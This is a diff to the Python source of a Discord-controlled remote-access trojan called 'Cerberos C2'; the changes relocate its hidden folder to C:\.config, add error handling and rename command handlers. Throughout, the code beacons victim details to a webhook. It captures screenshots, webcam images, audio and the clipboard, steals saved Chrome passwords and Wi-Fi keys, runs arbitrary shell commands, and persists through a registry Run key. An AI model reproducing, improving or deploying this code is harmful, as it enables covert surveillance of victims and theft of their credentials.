@@ -1,4 +1,9 @@
-
+################################################### 
+#
+#  Created on 7-January-2023 by RealDutch7
+#          Github: https://github.com/Vczz0
+#
+###################################################
 
 
 ### Imports
@@ -53,16 +58,19 @@ import folium
 
 
 usr = getpass.getuser()
-path_install = fr"C:\Users\{usr}\.config"
+path_install = fr"C:\.config"
 
 if not os.path.exists(path_install):
-    import os
-    usr = getpass.getuser()
-    path = fr'"C:\Users\{usr}\.config"'
-    new_path = path[1:]
-    new_path = new_path[:-1]
-    os.mkdir(new_path)     
-    os.system(f"attrib +h {path}")
+    try:
+        import os
+        usr = getpass.getuser()
+        path = fr'"C:\.config"'
+        new_path = path[1:]
+        new_path = new_path[:-1]
+        os.mkdir(new_path)     
+        os.system(f"attrib +h {path}")
+    except:
+        pass
 else:
     pass
 
@@ -75,9 +83,9 @@ MIC_ID = "[MICROPHONE_WEBHOOK]"
 DOWNLOAD_ID = "[DOWNLOAD_WEBHOOK]"
 BOT_TOKEN = "[BOT_TOKEN_HERE]"
 
-#
-version = "v1.0.0"
-author = "Vczz0"
+
+version = "v1.0.1"
+author = "RealDutch7"
 github_link = "https://github.com/Vczz0"
 
 ip = get('https://api.ipify.org').text
@@ -91,10 +99,11 @@ dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
 
 tmp = tempfile.gettempdir()
 
-bot = commands.Bot(command_prefix='!', help_command=None)
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='!', help_command=None, intents=intents)
 
 try:
-    path_config = fr"C:\Users\{usr}\.config\ID"
+    path_config = fr"C:\.config\ID"
     with open(path_config, "r+") as IDfile:
         ID = IDfile.read()
         if ID == "":
@@ -107,7 +116,7 @@ try:
             print(MSG)
 
 except Exception:
-    path_config = fr"C:\Users\{usr}\.config\ID"
+    path_config = fr"C:\.config\ID"
     with open(path_config, "w+") as IDfile:
         ID = IDfile.read()
         if ID == "":
@@ -124,8 +133,8 @@ embed = DiscordEmbed(title=f"**New Client Online: {usr}  #{ID}**" , description=
 embed.add_embed_field(name='Username: ', value=usr, inline=True)
 embed.add_embed_field(name='IP: ', value=ip, inline=True)
 embed.add_embed_field(name='OS: ', value=os, inline=True)
-embed.add_embed_field(name='Machine Name: ', value=name, inline=True)
-embed.add_embed_field(name='Bits: ', value=f"{bitz}s", inline=True)
+embed.add_embed_field(name='Machine: ', value=name, inline=True)
+embed.add_embed_field(name='Bits: ', value=bitz + "s", inline=True)
 embed.add_embed_field(name='OSVersion: ', value=vers, inline=True)
 embed.add_embed_field(name='CPU: ', value=cpu, inline=False)
 webhook.add_embed(embed)
@@ -140,7 +149,7 @@ async def info(ctx):
     if int(check_id[0]) == int(ID):
         try:
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
-            embed = DiscordEmbed(title=f"**Was Able To Grab Cerberos  C2 Info On: {usr} #{ID}**", description=None, color='09e30d')
+            embed = DiscordEmbed(title=f"**Was Able To Grab Cerberos C2 Info On: {usr} #{ID}**", description=None, color='09e30d')
             embed.add_embed_field(name="User: ", value=f"{usr} #{ID}", inline=True)
             embed.add_embed_field(name="Version: ", value=version, inline=True)
             embed.add_embed_field(name="Author: ", value=author, inline=True)
@@ -157,7 +166,7 @@ async def info(ctx):
 async def screenshot(ctx):
     command = ctx.message.content.replace("!screenshot", "")
     check_id = command.split()
-    path_screenshot = fr"C:\Users\{usr}\.config\tessssbhcbjkadlt.png"
+    path_screenshot = fr"C:\.config\tessssbhcbjkadlt.png"
     if int(check_id[0]) == int(ID):
         try:
             screenshot = pyautogui.screenshot()
@@ -182,7 +191,7 @@ async def frontcam(ctx):
     check_id = command.split()
     if int(check_id[0]) == int(ID):
         try:
-            path_cam = fr"C:\Users\{usr}\.config\895234g5234h689.jpg"
+            path_cam = fr"C:\.config\895234g5234h689.jpg"
             webcam = cv2.VideoCapture(0)
             check, frame = webcam.read()
             cv2.imwrite(filename=path_cam, img=frame)
@@ -222,7 +231,7 @@ async def frontcam(ctx):
             longi = data["geoplugin_longitude"]
             currency = data["geoplugin_currencyCode"]
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
-            embed = DiscordEmbed(title=f"**Was Able To Grab IPInfo: {usr} #{ID}**", description="Use The Function !map To Display Coordinates  In a Map", color='09e30d')
+            embed = DiscordEmbed(title=f"**Was Able To Grab IPInfo: {usr} #{ID}**", description=None, color='09e30d')
             embed.add_embed_field(name="IP: ", value=ip_req, inline=True)
             embed.add_embed_field(name="City: ", value=city, inline=True)
             embed.add_embed_field(name="Region: ", value=region, inline=True)
@@ -246,7 +255,7 @@ async def frontcam(ctx):
 async def map(ctx):
     command = ctx.message.content.replace("!ipmap", "")
     check_id = command.split()
-    path_map_loc = fr"c:\Users\{usr}\.config\map.html"
+    path_map_loc = fr"c:\.config\map.html"
     if int(check_id[0]) == int(ID):
         try:
             url = f"http://www.geoplugin.net/json.gp?ip={ip}"
@@ -275,7 +284,7 @@ async def map(ctx):
 async def mic(ctx):
     command = ctx.message.content.replace("!mic", "")
     check_id = command.split()
-    path_mic = fr"c:\Users\{usr}\.config\mic.wav"
+    path_mic = fr"c:\.config\mic.wav"
     if int(check_id[0]) == int(ID):
         try:
             def mic():
@@ -377,7 +386,7 @@ async def terminate(ctx):
 async def terminate(ctx):
     command = ctx.message.content.replace("!chromehistory", "")
     check_id = command.split()
-    path_history = fr"C:\Users\{usr}\.config\FileHistory.txt"
+    path_history = fr"C:\.config\FileHistory.txt"
     if int(check_id[0]) == int(ID):
         try:
             import os 
@@ -409,7 +418,7 @@ async def terminate(ctx):
 async def cmd(ctx):
     command = ctx.message.content.replace("!cmd", "")
     check_id = command.split()
-    path_command_store = fr"C:\Users\{usr}\.config\FileCmd.txt"
+    path_command_store = fr"C:\.config\FileCmd.txt"
     if int(check_id[0]) == int(ID):
         try:
             check_id.pop(0)
@@ -445,7 +454,7 @@ async def cmd(ctx):
 @bot.command(name="resetID", pass_ctx=True)
 async def reset(ctx):
     try:
-        path_upload = fr"C:\Users\{usr}\.config\ID"
+        path_upload = fr"C:\.config\ID"
         with open(path_upload, "w+") as IDfile:
             ID = random.randint(1, 10000)
             IDfile.write(str(ID))
@@ -469,7 +478,7 @@ async def destruct(ctx):
         try:
             import os
             import sys
-            path_destruct = fr"C:\Users\{usr}\.config"
+            path_destruct = fr"C:\.config"
             shutil.rmtree(path_destruct)
             path_persist_exe = fr"{tmp}\Config"
             if os.path.exists(path_persist_exe):
@@ -477,9 +486,10 @@ async def destruct(ctx):
                 subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /f", shell=True)
 
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
-            embed = DiscordEmbed(title=f"**Succesfull Destructed On: {usr} #{ID}**", description=None, color='09e30d')
+            embed = DiscordEmbed(title=f"**Succesfull Destructed On: {usr} #{ID}**", description="You can still execute a few system command", color='09e30d')
             webhook.add_embed(embed)
             response = webhook.execute()
+
         except Exception as e:
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
             embed = DiscordEmbed(title=f"**Not Able to Destruct On: {usr} #{ID}**", description=f"{e}", color='ff0000')
@@ -531,7 +541,7 @@ async def upload(ctx):
 async def clipboar(ctx):
     command = ctx.message.content.replace("!clipboard", "")
     check_id = command.split()
-    path_clipboard = fr"C:\Users\{usr}\.config\Clipboard.txt"
+    path_clipboard = fr"C:\.config\Clipboard.txt"
     if int(check_id[0]) == int(ID):
         try:
             win32clipboard.OpenClipboard()
@@ -823,7 +833,7 @@ async def chromecred(ctx):
     if int(check_id[0]) == int(ID): 
         try:
             import os
-            path = fr'"C:\Users\{usr}\.config\Chrome"'
+            path = fr'"C:\.config\Chrome"'
             new_path = path[1:]
             new_path = new_path[:-1]
             os.mkdir(new_path)  
@@ -875,17 +885,17 @@ async def chromecred(ctx):
                     date_created = row[4]
                     date_last_used = row[5]        
                     if username or password:
-                        print(f"Origin URL: {origin_url}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
-                        print(f"Action URL: {action_url}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
-                        print(f"Username: {username}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
-                        print(f"Password: {password}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Origin URL: {origin_url}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Action URL: {action_url}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Username: {username}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Password: {password}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
                     else:
                         continue
                     if date_created != 86400000000 and date_created:
-                        print(f"Creation date: {str(get_chrome_datetime(date_created))}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Creation date: {str(get_chrome_datetime(date_created))}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
                     if date_last_used != 86400000000 and date_last_used:
-                        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
-                    print("="*50, file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
+                        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
+                    print("="*50, file=open(fr"c:\.config\Chrome\ChromeCred.txt", "a"))
                 cursor.close()
                 db.close()
                 try:
@@ -900,11 +910,11 @@ async def chromecred(ctx):
             response = webhook.execute()
 
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Succesfull Grabbed Chrome History from: {usr} #{ID}")
-            with open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "rb") as f:
+            with open(fr"c:\.config\Chrome\ChromeCred.txt", "rb") as f:
                 webhook.add_file(file=f.read(), filename='ChromePw.txt')
             response = webhook.execute()
 
-            path_chrome = fr"c:\Users\{usr}\.config\Chrome"
+            path_chrome = fr"c:\.config\Chrome"
             shutil.rmtree(path_chrome)
 
         except Exception as e:
@@ -937,7 +947,7 @@ async def taskill(ctx):
 async def wifipw(ctx):
     command = ctx.message.content.replace("!wifipw", "")
     check_id = command.split()
-    path_wifi_pw = fr"c:\Users\{usr}\.config\wifipw.txt"
+    path_wifi_pw = fr"c:\.config\wifipw.txt"
     if int(check_id[0]) == int(ID): 
         try:
             data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
@@ -971,7 +981,7 @@ async def wifipw(ctx):
 async def chromecred(ctx):
     command = ctx.message.content.replace("!camcount", "")
     check_id = command.split()
-    camcount = fr"c:\Users\{usr}\.config\camcount.txt"
+    camcount = fr"c:\.config\camcount.txt"
     if int(check_id[0]) == int(ID): 
         try:
             def cam():
@@ -1015,7 +1025,7 @@ async def chromecred(ctx):
 async def usbcheck(ctx):
     command = ctx.message.content.replace("!usbcheck", "")
     check_id = command.split()
-    path_usb = fr"c:\Users\{usr}\.config\usb.txt"
+    path_usb = fr"c:\.config\usb.txt"
     if int(check_id[0]) == int(ID):
         try:
             print("Executed", file=open(path_usb, "w"))
@@ -1209,7 +1219,7 @@ async def working_dir(ctx):
 async def proc(ctx):
     command = ctx.message.content.replace("!allproc", "")
     check_id = command.split()
-    path_proc = fr"c:\Users\{usr}\.config\runningproc.txt"
+    path_proc = fr"c:\.config\runningproc.txt"
     if int(check_id[0]) == int(ID):
         try:
             import os
@@ -1580,8 +1590,8 @@ async def remove(ctx):
     if int(check_id[0]) == int(ID):
         try:
             clip_value = str(clipboard_value).strip("[]")
-            print(clip_value)
-            pyperclip.copy(str(clip_value))
+            clip_boar = clip_value.replace("'", "")
+            pyperclip.copy(str(clip_boar))
             spam = pyperclip.paste()
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
             embed = DiscordEmbed(title=f"**Successfull setted clipboard on: {usr} #{ID}**", description=f"{clip_value}", color='09e30d')
@@ -1613,7 +1623,7 @@ async def remove(ctx):
             response = webhook.execute()
 
 @bot.command(name="syslan", pass_ctx=True)
-async def remove(ctx):
+async def syslan(ctx):
     command = ctx.message.content.replace("!syslan", "")
     check_id = command.split()
     if int(check_id[0]) == int(ID):
@@ -1630,7 +1640,7 @@ async def remove(ctx):
             response = webhook.execute()
 
 @bot.command(name="terchrome", pass_ctx=True)
-async def remove(ctx):
+async def terchrome(ctx):
     command = ctx.message.content.replace("!terchrome", "")
     check_id = command.split()
     if int(check_id[0]) == int(ID):
@@ -1657,7 +1667,7 @@ async def remove(ctx):
             response = webhook.execute()
     
 @bot.command(name="tercmd", pass_ctx=True)
-async def remove(ctx):
+async def tercmd(ctx):
     command = ctx.message.content.replace("!tercmd", "")
     check_id = command.split()
     if int(check_id[0]) == int(ID):
